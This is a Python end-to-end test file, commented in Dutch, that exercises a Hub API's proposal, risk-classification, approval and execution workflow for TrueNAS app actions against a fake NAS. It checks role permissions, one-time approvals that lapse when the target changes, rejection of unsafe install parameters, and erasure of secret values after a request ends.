"""Dienst-E2E voor acties (contract 1.3 §8; B01-007, B01-003, B02-005/006; Sim-getest).

De **echte** Hub-API stelt voor, classificeert, laat goedkeuren, ondertekent en roept de **echte** executor-app aan;
die controleert zelf opnieuw en schrijft naar de fake TrueNAS. Geen echte NAS: alles hier is Sim-getest.
"""

from __future__ import annotations

import copy
import threading
import uuid
from collections.abc import Iterator
from datetime import timedelta
from pathlib import Path
from typing import Any

import pytest
from actiehelpers import (
    Served,
    Stack,
    app_target,
    audit_acties,
    bouw_stack,
    haal,
    hashes,
    keur_goed,
    schrijfaanroepen,
    stel_voor,
    voer_uit,
)
from conftest import idem, login_as, make_user
from executorhelpers import WRITE_KEY, write_nas
from fakes.fake_truenas import FakeTrueNAS
from policyhelpers import DIGEST, DIGEST_B, install_params

pytestmark = [pytest.mark.e2e, pytest.mark.integration]
REPO = "ghcr.io/voorbeeld/demo-app"
GEHEIM = "waarde-alleen-voor-de-app-417"


@pytest.fixture
def nas() -> Iterator[FakeTrueNAS]:
    fake = write_nas().start()
    yield fake
    fake.stop()


@pytest.fixture
def stack(
    admin: Any, app: Any, nas: FakeTrueNAS, worker_once: Any, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> Iterator[Stack]:
    s = bouw_stack(admin=admin, app=app, nas=nas, worker_once=worker_once, tmp_path=tmp_path, monkeypatch=monkeypatch)
    yield s
    s.stop()


def _codes(voorstel: dict[str, Any]) -> list[str]:
    return [b["code"] for b in voorstel["blokkades"]]


def _geblokkeerd(r: Any, code: str) -> None:
    assert r.status_code == 409 and r.json()["code"] == "actie_geblokkeerd", r.text
    assert code in [b["code"] for b in r.json()["details"]["blokkades"]], r.text


def _rij(app: Any, request_id: str) -> Any:
    from hub.models import ActionRequest

    with app.state.sessionmaker() as db:
        return db.get(ActionRequest, uuid.UUID(request_id))


# ---------------------------------------------------------------------- R1: zonder goedkeuring
def test_r1_herstart_zonder_goedkeuring_met_readback(stack: Stack) -> None:
    admin, nas = stack.admin, stack.nas
    r = stel_voor(admin, "app.restart", app_target("my-house"), risk_claim="R0")
    assert r.status_code == 201, r.text
    v = r.json()
    # EX18: de claim wordt bewaard en genegeerd; het beleid bepaalt R1.
    assert v["risk_class"] == "R1" and v["risk_claim"] == "R0" and v["risk_claim_genegeerd"] is True
    assert v["status"] == "klaar" and v["goedkeuring_nodig"] is False and v["blokkades"] == []
    assert v["preview"]["wijziging"] == {"soort": "restart", "app": "my-house", "verwacht": {"staat": "RUNNING"}}
    assert schrijfaanroepen(nas) == []  # een voorstel wijzigt niets
    # Goedkeuren van een R1-actie bestaat niet.
    r = keur_goed(admin, v)
    assert r.status_code == 409 and r.json()["code"] == "status_past_niet", r.text
    r = voer_uit(admin, v)
    assert r.status_code == 200, r.text
    uit = r.json()
    assert uit["status"] == "uitgevoerd" and uit["resultaat"]["status"] == "uitgevoerd"
    assert uit["resultaat"]["before_hash"] and uit["resultaat"]["after_hash"]
    assert uit["resultaat"]["methode"] == "app.redeploy" and uit["goedkeuring"] is None
    assert schrijfaanroepen(nas) == ["app.redeploy"]
    assert haal(admin, v)["status"] == "uitgevoerd"
    acties = audit_acties(stack.app)
    for verwacht in ("action.proposal.created", "action.execution.started", "action.execution.succeeded"):
        assert verwacht in acties
    # Tweede keer uitvoeren kan niet: de status past niet meer en TrueNAS krijgt niets.
    r = voer_uit(admin, v)
    assert r.status_code == 409 and r.json()["code"] == "status_past_niet", r.text
    assert schrijfaanroepen(nas) == ["app.redeploy"]
    # Anti-flap: binnen de afkoeltijd wordt dezelfde app niet nog eens herstart, door wie ook.
    r = stel_voor(admin, "app.restart", app_target("my-house"))
    assert r.status_code == 201 and "cooldown" in _codes(r.json()), r.text
    _geblokkeerd(voer_uit(admin, r.json()), "cooldown")
    assert schrijfaanroepen(nas) == ["app.redeploy"]


def test_operator_voert_r1_uit_kijker_niet(stack: Stack) -> None:
    """``jellyfin`` is hier een catalogusapp: stoppen blijft R1 (een Custom App stoppen is R2, zie
    test_stoppen_van_een_custom_app_vraagt_goedkeuring_van_een_beheerder). In de fake staat jellyfin gestopt; de test
    zet hem eerst aan, zodat "gestopt" na afloop iets bewijst (R-VEILIG-6 van S-P2-005, V-003)."""
    nas = stack.nas
    nas._set_state(nas.app("jellyfin"), "RUNNING")
    assert nas.app("jellyfin")["state"] == "RUNNING"
    make_user(stack.admin, "oscar", "operator")
    make_user(stack.admin, "vera", "viewer")
    oscar, vera = login_as(stack.app, "oscar"), login_as(stack.app, "vera")
    assert stel_voor(vera, "app.stop", app_target("jellyfin")).status_code == 403
    r = stel_voor(oscar, "app.stop", app_target("jellyfin"))
    assert r.status_code == 201, r.text
    v = r.json()
    assert v["actor"] == {"type": "user", "id": "oscar"} and v["risk_class"] == "R1"
    assert vera.get(f"/api/v1/actions/{v['request_id']}").status_code == 200  # lezen mag
    assert voer_uit(vera, v).status_code == 403
    assert schrijfaanroepen(nas) == [] and nas.app("jellyfin")["state"] == "RUNNING"
    r = voer_uit(oscar, v)
    assert r.status_code == 200 and r.json()["status"] == "uitgevoerd", r.text
    assert schrijfaanroepen(nas) == ["app.stop"] and nas.app("jellyfin")["state"] == "STOPPED"
    # Een voorstel namens iemand anders bestaat niet.
    r = stel_voor(oscar, "app.start", app_target("jellyfin"), actor={"type": "user", "id": "beheerder"})
    assert r.status_code == 422 and r.json()["code"] == "actor_past_niet", r.text
    r = stel_voor(oscar, "app.start", app_target("jellyfin"), actor={"type": "ai", "id": "oscar"})
    assert r.status_code == 422 and r.json()["code"] == "actor_past_niet", r.text


TERUG_CUSTOM_APP = "alleen in de TrueNAS-web-UI"


def test_stoppen_van_een_custom_app_vraagt_goedkeuring_van_een_beheerder(
    stack: Stack, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Besluit van de gebruiker (2026-11-11; ADR-0030 besluit 21): een Custom App die het platform stopt, start het
    daarna niet meer (``doel_niet_herkenbaar``). Daarom vraagt ``app.stop`` op een Custom App altijd een goedkeuring
    van een beheerder (R2) en gebeurt hij nooit automatisch: een operator kan hem voorstellen maar niet goedkeuren of
    uitvoeren, en ook een beheerder voert hem niet uit zonder goedkeuring. De preview zegt eerlijk dat weer starten
    daarna alleen in de TrueNAS-web-UI kan. Een catalogusapp stoppen blijft R1, met "Starten met app.start."."""
    admin, nas = stack.admin, stack.nas
    make_user(admin, "oscar", "operator")
    oscar = login_as(stack.app, "oscar")
    naar_executor = _naar_executor(monkeypatch)
    r = stel_voor(oscar, "app.stop", app_target("my-house"))
    assert r.status_code == 201, r.text
    v = r.json()
    assert v["risk_class"] == "R2" and v["goedkeuring_nodig"] is True and v["status"] == "wacht_op_goedkeuring"
    assert "STOP-EENRICHTING" in v["rule_ids"] and v["blokkades"] == []
    assert v["preview"]["wijziging"] == {"soort": "stop", "app": "my-house", "verwacht": {"staat": "STOPPED"}}
    assert TERUG_CUSTOM_APP in v["preview"]["terugdraaien"] and "doel_niet_herkenbaar" in v["preview"]["terugdraaien"]
    assert "Starten met app.start" not in v["preview"]["terugdraaien"]
    # Zonder goedkeuring voert niemand hem uit, en een operator keurt niet goed.
    r = voer_uit(oscar, v)
    assert r.status_code == 409 and r.json()["code"] == "goedkeuring_nodig", r.text
    r = voer_uit(admin, v)
    assert r.status_code == 409 and r.json()["code"] == "goedkeuring_nodig", r.text
    assert keur_goed(oscar, v).status_code == 403
    assert naar_executor == [] and schrijfaanroepen(nas) == [] and nas.app("my-house")["state"] == "RUNNING"
    # Met de goedkeuring van een beheerder: alleen een beheerder voert hem uit.
    assert keur_goed(admin, v).status_code == 200
    assert voer_uit(oscar, v).status_code == 403
    r = voer_uit(admin, v)
    assert r.status_code == 200 and r.json()["status"] == "uitgevoerd", r.text
    assert naar_executor == [v["request_id"]] and schrijfaanroepen(nas) == ["app.stop"]
    assert nas.app("my-house")["state"] == "STOPPED"
    # Een catalogusapp stoppen blijft R1: een operator voert het zonder goedkeuring uit, en starten kan weer. In de fake
    # staat jellyfin gestopt: eerst aanzetten, anders bewijst "gestopt" niets (R-VEILIG-6 van S-P2-005, V-003).
    nas._set_state(nas.app("jellyfin"), "RUNNING")
    assert nas.app("jellyfin")["state"] == "RUNNING"
    r = stel_voor(oscar, "app.stop", app_target("jellyfin"))
    assert r.status_code == 201, r.text
    w = r.json()
    assert w["risk_class"] == "R1" and w["goedkeuring_nodig"] is False and w["status"] == "klaar"
    assert "STOP-EENRICHTING" not in w["rule_ids"] and w["preview"]["terugdraaien"] == "Starten met app.start."
    assert voer_uit(oscar, w).status_code == 200 and nas.app("jellyfin")["state"] == "STOPPED"
    assert schrijfaanroepen(nas) == ["app.stop", "app.stop"]
    r = stel_voor(oscar, "app.start", app_target("jellyfin"))
    assert r.status_code == 201, r.text
    s = r.json()
    assert s["risk_class"] == "R1" and s["status"] == "klaar" and s["blokkades"] == [], r.text
    r = voer_uit(oscar, s)
    assert r.status_code == 200 and r.json()["status"] == "uitgevoerd", r.text
    assert nas.app("jellyfin")["state"] == "RUNNING" and schrijfaanroepen(nas) == ["app.stop", "app.stop", "app.start"]


def test_kritieke_app_is_r2_ook_als_de_aanvrager_r0_claimt(stack: Stack) -> None:
    nas = stack.nas
    kritiek = copy.deepcopy(nas.app("my-house"))
    kritiek["name"] = kritiek["id"] = "adguard-home"
    nas.data["app.query"].append(kritiek)
    r = stel_voor(stack.admin, "app.restart", app_target("adguard-home"), risk_claim="R0")
    assert r.status_code == 201, r.text
    v = r.json()
    assert v["risk_class"] == "R2" and v["goedkeuring_nodig"] is True and v["status"] == "wacht_op_goedkeuring"
    assert v["preview"]["kritiek"] is True and v["risk_claim_genegeerd"] is True
    r = voer_uit(stack.admin, v)
    assert r.status_code == 409 and r.json()["code"] == "goedkeuring_nodig", r.text
    assert schrijfaanroepen(nas) == []


# ---------------------------------------------------------------------- R2: installeren en verwijderen (B01-003)
def test_installeren_met_goedkeuring_en_verwijderen_zonder_dataverlies(stack: Stack) -> None:
    admin, nas = stack.admin, stack.nas
    make_user(admin, "oscar", "operator")
    oscar = login_as(stack.app, "oscar")
    envs = [{"name": "APP_MODE", "value": "prod"}, {"name": "PROEF_INSTELLING", "value": GEHEIM}]
    r = stel_voor(oscar, "app.install", app_target("demo-app"), install_params("demo-app", envs=envs))
    assert r.status_code == 201, r.text
    v = r.json()
    assert v["risk_class"] == "R2" and v["status"] == "wacht_op_goedkeuring" and v["blokkades"] == []
    w = v["preview"]["wijziging"]
    assert w["installatiemethode"].startswith("standaard Custom App") and w["custom_compose"] is False
    assert w["image"]["digest"] == DIGEST if isinstance(w["image"], dict) else DIGEST in str(w["image"])
    assert w["omgevingsvariabelen"] == ["APP_MODE", "PROEF_INSTELLING"] and w["privileged"] is False
    assert "blijven staan" in v["preview"]["dataretentie"]
    # Waarden van omgevingsvariabelen staan nergens in het antwoord, de lijst of de audit.
    assert GEHEIM not in r.text and GEHEIM not in admin.get("/api/v1/actions").text
    assert GEHEIM not in admin.get("/api/v1/audit", params={"limit": 200}).text
    assert "one_time_nonce" not in r.text

    # Zonder goedkeuring gebeurt er niets; een operator kan niet goedkeuren.
    r = voer_uit(admin, v)
    assert r.status_code == 409 and r.json()["code"] == "goedkeuring_nodig", r.text
    assert keur_goed(oscar, v).status_code == 403
    # Goedkeuren kan alleen voor precies de preview die de beheerder zag.
    r = keur_goed(admin, v, preview_hash="sha256:" + "0" * 64)
    assert r.status_code == 409 and r.json()["code"] == "preview_gewijzigd", r.text
    assert r.json()["details"]["gewijzigd"] == ["preview_hash"]
    assert haal(admin, v)["goedkeuring"] is None
    r = keur_goed(admin, v)
    assert r.status_code == 200, r.text
    g = r.json()["goedkeuring"]
    assert r.json()["status"] == "goedgekeurd" and g["approved_by"] == "beheerder" and g["gebruikt_op"] is None
    assert {k: g[k] for k in hashes(v)} == hashes(v) and "one_time_nonce" not in r.text
    from asm_policy.execreq import parse_ts

    assert timedelta(0) < parse_ts(g["expires_at"]) - parse_ts(g["approved_at"]) <= timedelta(minutes=15)
    assert schrijfaanroepen(nas) == []

    # R2 uitvoeren: alleen een beheerder.
    r = voer_uit(oscar, v)
    assert r.status_code == 403 and schrijfaanroepen(nas) == [], r.text
    r = voer_uit(admin, v)
    assert r.status_code == 200, r.text
    uit = r.json()
    assert uit["status"] == "uitgevoerd" and uit["resultaat"]["methode"] == "app.create"
    assert uit["goedkeuring"]["gebruikt_op"] and GEHEIM not in r.text
    # Precies een standaard Custom App (ix-app-waarden); nooit een compose-veld.
    assert len(nas.created) == 1
    body = nas.created[0]
    assert set(body) == {"app_name", "custom_app", "catalog_app", "train", "version", "values"}
    assert body["custom_app"] is False and body["catalog_app"] == "ix-app" and body["values"]["envs"] == envs
    assert "app.create(custom_compose)" not in nas.mutations and "compose" not in str(body)
    assert schrijfaanroepen(nas) == ["app.create"]
    # EX20: de goedkeuring is één keer bruikbaar.
    r = voer_uit(admin, v)
    assert r.status_code == 409 and r.json()["code"] == "status_past_niet", r.text
    assert schrijfaanroepen(nas) == ["app.create"]
    # Nog eens installeren over de bestaande app heen kan niet.
    r = stel_voor(admin, "app.install", app_target("demo-app"), install_params("demo-app"))
    assert r.status_code == 409 and r.json()["code"] == "doel_bestaat_al", r.text

    # Verwijderen = alleen de containers; datasets, snapshots en images blijven staan.
    datasets = sorted(nas.datasets())
    snapshots = copy.deepcopy(nas.data["snapshots"])
    r = stel_voor(admin, "app.uninstall", app_target("demo-app"))
    assert r.status_code == 201, r.text
    u = r.json()
    assert u["risk_class"] == "R2" and u["status"] == "wacht_op_goedkeuring"
    assert u["preview"]["wijziging"] == {
        "soort": "verwijderen",
        "app": "demo-app",
        "alleen_containers": True,
        "remove_ix_volumes": False,
        "remove_images": False,
    }
    assert keur_goed(admin, u).status_code == 200
    r = voer_uit(admin, u)
    assert r.status_code == 200 and r.json()["resultaat"]["methode"] == "app.delete", r.text
    assert nas.deleted == [("demo-app", {"remove_images": False, "remove_ix_volumes": False})]
    assert sorted(nas.datasets()) == datasets and nas.data["snapshots"] == snapshots
    assert schrijfaanroepen(nas) == ["app.create", "app.delete"]
    assert "pool.dataset.delete" not in nas.mutations


@pytest.mark.parametrize(
    ("wijziging", "plek"),
    [
        ({"custom_compose_config": {"services": {}}}, "app_create"),
        ({"custom_compose_config_string": "services: {}"}, "app_create"),
        ({"custom_app": True}, "app_create"),
        ({"privileged": True}, "values"),
        ({"host_network": True}, "values"),
        ({"image": {"repository": REPO, "tag": "latest"}}, "values"),
    ],
)
def test_compose_latest_en_gevaarlijke_waarden_worden_al_bij_het_voorstel_geweigerd(
    stack: Stack, wijziging: dict[str, Any], plek: str
) -> None:
    params = install_params("demo-app")
    doel = params["app_create"] if plek == "app_create" else params["app_create"]["values"]
    doel.update(wijziging)
    r = stel_voor(stack.admin, "app.install", app_target("demo-app"), params)
    assert r.status_code == 422 and r.json()["code"] == "parameters_ongeldig", r.text
    assert r.json()["details"]["fouten"]
    assert stack.admin.get("/api/v1/actions").json()["items"] == [] and schrijfaanroepen(stack.nas) == []


def test_kluisverwijzingen_bij_installeren_eerlijk_nog_niet_beschikbaar(stack: Stack) -> None:
    ref = "vault://app/demo-app/api-sleutel"
    envs = [{"name": "API_TOKEN", "value": ref}]
    r = stel_voor(stack.admin, "app.install", app_target("demo-app"), install_params("demo-app", envs=envs))
    assert r.status_code == 501 and r.json()["code"] == "capability_unavailable", r.text
    assert r.json()["details"]["reden"] == "vault_verwijzingen" and schrijfaanroepen(stack.nas) == []
    envs = [{"name": "API_SLEUTEL", "value": ref}]
    r = stel_voor(stack.admin, "app.install", app_target("demo-app"), install_params("demo-app", envs=envs))
    assert r.status_code == 422 and r.json()["code"] == "parameters_ongeldig", r.text
    assert [f["code"] for f in r.json()["details"]["fouten"]] == ["secret_in_form"]
    assert schrijfaanroepen(stack.nas) == []


def _tabellen_met(app: Any, waarde: str) -> list[str]:
    """Alle tabellen van de Hub-database waarin ``waarde`` ergens in een rij staat."""
    from sqlalchemy import text

    with app.state.sessionmaker() as db:
        tabellen = [str(r[0]) for r in db.execute(text("SELECT tablename FROM pg_tables WHERE schemaname='public'"))]
        return sorted(
            t
            for t in tabellen
            if db.execute(
                text(f'SELECT count(*) FROM "{t}" x WHERE x::text LIKE :w'),  # noqa: S608 - namen uit pg_tables
                {"w": f"%{waarde}%"},
            ).scalar()
        )


def test_installatiewaarden_blijven_na_afloop_niet_in_de_hub(stack: Stack) -> None:
    """ADR-0030 besluit 28: waarden van omgevingsvariabelen staan nooit in een preview, log of audit. Zolang een
    voorstel open is, bewaart de Hub ze (nodig voor het uitvoeren); na afloop (uitgevoerd, afgewezen, verlopen) staan
    ze nergens meer in de database van de Hub, en dus ook niet in zijn back-up. Alleen hun SHA-256 blijft."""
    from hub.models import ActionRequest
    from hub.timeutil import utcnow

    admin, nas = stack.admin, stack.nas
    geheim = {"uit": "waarde-uitgevoerd-5521", "af": "waarde-afgewezen-5522", "verl": "waarde-verlopen-5523"}

    def voorstel(app_id: str, waarde: str) -> dict[str, Any]:
        envs = [{"name": "APP_MODE", "value": "prod"}, {"name": "PROEF_INSTELLING", "value": waarde}]
        r = stel_voor(admin, "app.install", app_target(app_id), install_params(app_id, envs=envs))
        assert r.status_code == 201, r.text
        return dict(r.json())

    a = voorstel("demo-app", geheim["uit"])
    assert _tabellen_met(stack.app, geheim["uit"]) == ["action_request"]
    assert keur_goed(admin, a).status_code == 200
    r = voer_uit(admin, a)
    assert r.status_code == 200 and r.json()["status"] == "uitgevoerd", r.text
    assert nas.created[0]["values"]["envs"][1] == {"name": "PROEF_INSTELLING", "value": geheim["uit"]}
    b = voorstel("demo-b", geheim["af"])
    r = admin.post(f"/api/v1/actions/{b['request_id']}/reject", json={"reden": "niet nu"}, headers=idem())
    assert r.status_code == 200 and r.json()["status"] == "afgewezen", r.text
    c = voorstel("demo-c", geheim["verl"])
    with stack.app.state.sessionmaker() as db:
        rij = db.get(ActionRequest, uuid.UUID(c["request_id"]))
        rij.geldig_tot = utcnow() - timedelta(seconds=1)
        db.commit()
    assert haal(admin, c)["status"] == "verlopen"
    for waarde in geheim.values():
        assert _tabellen_met(stack.app, waarde) == [], waarde
    # De hash van de parameters blijft gelijk (preview en audit verwijzen ernaar).
    for v in (a, b, c):
        assert haal(admin, v)["parameters_sha256"] == v["parameters_sha256"]
    assert schrijfaanroepen(nas) == ["app.create"]


def test_vrije_tekst_in_installatiewaarden_ook_weg_na_elke_eindstatus(
    stack: Stack, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    """S-P2-010, bouwpunt 6e (ADR-0030 besluit 28): naast de waarden van omgevingsvariabelen kan ook vrije tekst in
    ``labels`` en ``notes`` een geheim bevatten. Na afloop staat die nergens meer in de database van de Hub: na
    uitgevoerd, afgewezen, verlopen, geweigerd bij de herberekening (``_herbereken``) en onbekend (``_sluit``). Zolang
    een voorstel open is, staat hij er wel.

    Sinds S-P2-040 (R-VEILIG-1; ADR-0030 besluit 32) staan ``labels`` en ``notes`` mét waarde in de preview: ook in de
    antwoorden, die de idempotentie-opslag hooguit een dag bewaart (de worker ruimt ze op); na afloop wist de Hub ze ook
    uit de bewaarde preview. ``command`` en ``entrypoint`` weigert de Hub nu al bij het voorstel; een open voorstel van
    vóór dat herstel met zo'n opdracht wordt bij goedkeuren geweigerd en gewist (integratietest
    ``test_open_voorstel_met_eigen_opdracht_van_voor_het_herstel_wordt_geweigerd``)."""
    import shutil

    from asm_policy import load_policy
    from policyhelpers import POLICY_DIR

    from hub.actions import service
    from hub.models import ActionRequest
    from hub.timeutil import utcnow

    admin, nas = stack.admin, stack.nas

    def voorstel(app_id: str, w: str) -> dict[str, Any]:
        params = install_params(
            app_id,
            envs=[{"name": "PROEF_INSTELLING", "value": f"{w}-env"}],
            notes=f"notitie {w}-notes",
            labels=[{"key": "proef", "value": f"{w}-label", "containers": [app_id]}],
        )
        r = stel_voor(admin, "app.install", app_target(app_id), params)
        assert r.status_code == 201, r.text
        assert _tabellen_met(stack.app, f"{w}-env") == ["action_request"], w
        for veld in ("notes", "label"):
            assert _tabellen_met(stack.app, f"{w}-{veld}") == ["action_request", "idempotency_record"], (w, veld)
        return dict(r.json())

    # Uitgevoerd: TrueNAS kreeg de waarden; daarna staan ze niet meer in de Hub.
    a = voorstel("demo-app", "geheim-uit-6101")
    assert keur_goed(admin, a).status_code == 200
    r = voer_uit(admin, a)
    assert r.status_code == 200 and r.json()["status"] == "uitgevoerd", r.text
    assert nas.created[0]["values"]["notes"] == "notitie geheim-uit-6101-notes"
    # Afgewezen en verlopen.
    b = voorstel("demo-b", "geheim-af-6102")
    r = admin.post(f"/api/v1/actions/{b['request_id']}/reject", json={"reden": "niet nu"}, headers=idem())
    assert r.status_code == 200 and r.json()["status"] == "afgewezen", r.text
    c = voorstel("demo-c", "geheim-verl-6103")
    with stack.app.state.sessionmaker() as db:
        rij = db.get(ActionRequest, uuid.UUID(c["request_id"]))
        rij.geldig_tot = utcnow() - timedelta(seconds=1)
        db.commit()
    assert haal(admin, c)["status"] == "verlopen"
    # Geweigerd bij de herberekening: het beleid is inmiddels strenger (nieuwe Hub-image) en herkent de naam als Emby.
    d = voorstel("demo-d", "geheim-gew-6104")
    assert keur_goed(admin, d).status_code == 200
    streng = tmp_path / "beleid-streng"
    shutil.copytree(POLICY_DIR, streng)
    apps = streng / "apps.yaml"
    oud = "emby: {namen: [emby, embyserver, emby-server]}"
    nieuw = "emby: {namen: [emby, embyserver, emby-server, demo-d]}"
    assert oud in apps.read_text(encoding="utf-8")
    apps.write_text(apps.read_text(encoding="utf-8").replace(oud, nieuw), encoding="utf-8")
    with monkeypatch.context() as mp:
        mp.setattr(service, "get_policy", lambda: load_policy(streng))
        r = voer_uit(admin, d)
    assert r.status_code == 403 and r.json()["code"] == "actie_geweigerd", r.text
    assert "emby_nooit_door_platform" in [x["code"] for x in r.json()["details"]["blokkades"]], r.text
    assert haal(admin, d)["status"] == "geweigerd"
    # Onbekend: de executor is weg tijdens het uitvoeren.
    e = voorstel("demo-e", "geheim-onb-6105")
    r = keur_goed(admin, e)
    assert r.status_code == 200, r.text
    stack.servers.pop().stop()
    r = voer_uit(admin, e)
    assert r.status_code == 502 and r.json()["code"] == "uitkomst_onbekend", r.text
    assert haal(admin, e)["status"] == "onbekend"
    alle = ("geheim-uit-6101", "geheim-af-6102", "geheim-verl-6103", "geheim-gew-6104", "geheim-onb-6105")
    for w in alle:
        assert _tabellen_met(stack.app, f"{w}-env") == [], w
        for veld in ("notes", "label"):
            assert _tabellen_met(stack.app, f"{w}-{veld}") == ["idempotency_record"], (w, veld)
    # De idempotentie-opslag ruimt de worker na een dag op; daarna staat de vrije tekst nergens meer.
    from sqlalchemy import update

    from hub import worker
    from hub.models import IdempotencyRecord

    with stack.app.state.sessionmaker() as db:
        db.execute(update(IdempotencyRecord).values(created_at=IdempotencyRecord.created_at - timedelta(days=2)))
        worker.cleanup(db)
        db.commit()
    for w in alle:
        for veld in ("env", "notes", "label"):
            assert _tabellen_met(stack.app, f"{w}-{veld}") == [], (w, veld)
    for v in (a, b, c, d, e):
        assert haal(admin, v)["parameters_sha256"] == v["parameters_sha256"]
    # Wat er gewist is, staat er eerlijk bij; de namen van de variabelen blijven.
    with stack.app.state.sessionmaker() as db:
        rij = db.get(ActionRequest, uuid.UUID(e["request_id"]))
        values = rij.parameters["app_create"]["values"]
        assert values["envs"] == [{"name": "PROEF_INSTELLING", "waarde_gewist": True}]
        assert sorted(values["vrije_tekst_gewist"]) == ["labels", "notes"]
        assert not {"labels", "notes"} & set(values)
        getoond = rij.preview["wijziging"]["waarden"]
        assert getoond["labels"] == getoond["notes"] == {"waarde_gewist": True}, getoond
        assert getoond["envs"] == ["PROEF_INSTELLING"], getoond
    assert schrijfaanroepen(nas) == ["app.create"]


# ---------------------------------------------------------------------- goedkeuring: gebonden, eenmalig, tijdelijk
def test_goedkeuring_vervalt_als_het_doel_na_de_goedkeuring_wijzigt(stack: Stack) -> None:
    """EX19: verandert er iets aan een gebonden veld, dan is er niets goedgekeurd."""
    admin, nas = stack.admin, stack.nas
    v = stel_voor(admin, "app.uninstall", app_target("my-house")).json()
    assert keur_goed(admin, v).status_code == 200
    nas.app("my-house")["state"] = "STOPPED"  # iemand stopt de app buiten de Hub om
    r = voer_uit(admin, v)
    assert r.status_code == 409 and r.json()["code"] == "goedkeuring_vervallen", r.text
    assert {"resource_etag", "preview_hash"} <= set(r.json()["details"]["gewijzigd"])
    assert schrijfaanroepen(nas) == []
    nu = haal(admin, v)
    assert nu["status"] == "wacht_op_goedkeuring" and nu["goedkeuring"]["vervallen_op"]
    assert nu["goedkeuring"]["vervallen_reden"].startswith("gewijzigd:")
    assert nu["resource_etag"] != v["resource_etag"] and nu["preview_hash"] != v["preview_hash"]
    assert "action.approval.lapsed" in audit_acties(stack.app)
    # De oude hashes goedkeuren kan niet meer; de nieuwe preview wel.
    r = keur_goed(admin, v)
    assert r.status_code == 409 and r.json()["code"] == "preview_gewijzigd", r.text
    assert keur_goed(admin, nu).status_code == 200
    r = voer_uit(admin, nu)
    assert r.status_code == 200 and r.json()["status"] == "uitgevoerd", r.text
    assert schrijfaanroepen(nas) == ["app.delete"]


def test_doel_wijzigt_tussen_voorstel_en_goedkeuring(stack: Stack) -> None:
    admin, nas = stack.admin, stack.nas
    v = stel_voor(admin, "app.uninstall", app_target("my-house")).json()
    nas.app("my-house")["state"] = "STOPPED"
    r = keur_goed(admin, v)
    assert r.status_code == 409 and r.json()["code"] == "preview_gewijzigd", r.text
    assert haal(admin, v)["goedkeuring"] is None and schrijfaanroepen(nas) == []
    # Een voorstel met een verouderde expected_version wordt niet eens aangenomen.
    r = stel_voor(admin, "app.stop", app_target("mediaguard"), expected_version="sha256:" + "0" * 64)
    assert r.status_code == 409 and r.json()["code"] == "doel_gewijzigd", r.text


@pytest.mark.parametrize("wijziging", ["versie", "digest"])
def test_gewijzigde_appversie_of_digest_vraagt_opnieuw_goedkeuren(stack: Stack, wijziging: str) -> None:
    """B01-007, acceptatie: bij een gewijzigde appversie tussen preview en goedkeuring opnieuw goedkeuren. Ook tussen
    goedkeuring en uitvoering, en ook een andere digest onder dezelfde tag: de goedkeuring vervalt en TrueNAS krijgt
    niets. Daarna is de nieuwe preview gewoon goed te keuren en uit te voeren."""
    import hashlib

    admin, nas = stack.admin, stack.nas
    app = nas.app("my-house")
    assert app is not None

    def wijzig(n: int) -> None:
        if wijziging == "versie":
            nas._set_image(app, {"repository": "ghcr.io/lvos04/my_house", "tag": f"0.1.{n}"})
            return
        ref = app["active_workloads"]["images"][0]
        rij = next(i for i in nas.data["app.image.query"] if ref in i["repo_tags"])
        rij["repo_digests"] = [f"{ref.rsplit(':', 1)[0]}@sha256:" + hashlib.sha256(f"{ref}-{n}".encode()).hexdigest()]

    v = stel_voor(admin, "app.uninstall", app_target("my-house")).json()
    wijzig(1)  # tussen preview en goedkeuring
    r = keur_goed(admin, v)
    assert r.status_code == 409 and r.json()["code"] == "preview_gewijzigd", r.text
    assert "resource_etag" in r.json()["details"]["gewijzigd"], r.text
    nu = haal(admin, v)
    assert nu["goedkeuring"] is None and nu["resource_etag"] != v["resource_etag"]
    assert keur_goed(admin, nu).status_code == 200
    wijzig(2)  # tussen goedkeuring en uitvoering
    r = voer_uit(admin, nu)
    assert r.status_code == 409 and r.json()["code"] == "goedkeuring_vervallen", r.text
    assert "resource_etag" in r.json()["details"]["gewijzigd"], r.text
    assert schrijfaanroepen(nas) == []
    weer = haal(admin, v)
    assert weer["status"] == "wacht_op_goedkeuring" and weer["goedkeuring"]["vervallen_reden"].startswith("gewijzigd:")
    assert keur_goed(admin, weer).status_code == 200
    r = voer_uit(admin, weer)
    assert r.status_code == 200 and r.json()["status"] == "uitgevoerd", r.text
    assert schrijfaanroepen(nas) == ["app.delete"]


def test_goedkeuring_is_eenmalig_ook_als_de_status_wordt_teruggezet(stack: Stack) -> None:
    """EX20: zelfs als de status van het verzoek (door een fout of ingreep) weer 'goedgekeurd' wordt, is de
    goedkeuring verbruikt."""
    from hub.models import ActionRequest

    admin, nas = stack.admin, stack.nas
    v = stel_voor(admin, "app.uninstall", app_target("my-house")).json()
    assert keur_goed(admin, v).status_code == 200
    origineel = copy.deepcopy(nas.app("my-house"))
    r = voer_uit(admin, v)
    assert r.status_code == 200, r.text
    # De app staat er (buiten de Hub om) weer precies zo en de status wordt teruggezet: alles klopt weer, behalve
    # dat de goedkeuring al verbruikt is.
    nas.data["app.query"].append(origineel)
    with stack.app.state.sessionmaker() as db:
        rij = db.get(ActionRequest, uuid.UUID(v["request_id"]))
        rij.status = "goedgekeurd"
        db.commit()
    r = voer_uit(admin, v)
    assert r.status_code == 409 and r.json()["code"] == "goedkeuring_al_gebruikt", r.text
    assert schrijfaanroepen(nas) == ["app.delete"]


def test_tweede_goedkeuring_op_een_goedgekeurd_voorstel_wordt_geweigerd(stack: Stack) -> None:
    """Een goedgekeurd voorstel is niet nog eens goed te keuren: er blijft precies één goedkeuring. Na het uitvoeren
    zijn goedkeuren en uitvoeren allebei voorbij."""
    from sqlalchemy import select

    from hub.models import Approval

    admin, nas = stack.admin, stack.nas
    v = stel_voor(admin, "app.uninstall", app_target("my-house")).json()
    assert keur_goed(admin, v).status_code == 200
    r = keur_goed(admin, v)
    assert r.status_code == 409 and r.json()["code"] == "status_past_niet", r.text
    with stack.app.state.sessionmaker() as db:
        rijen = list(db.scalars(select(Approval).where(Approval.request_id == uuid.UUID(v["request_id"]))))
    assert len(rijen) == 1 and rijen[0].vervallen_op is None and rijen[0].used_at is None
    r = voer_uit(admin, v)
    assert r.status_code == 200, r.text
    for _ in range(2):
        r = keur_goed(admin, v)
        assert r.status_code == 409 and r.json()["code"] == "status_past_niet", r.text
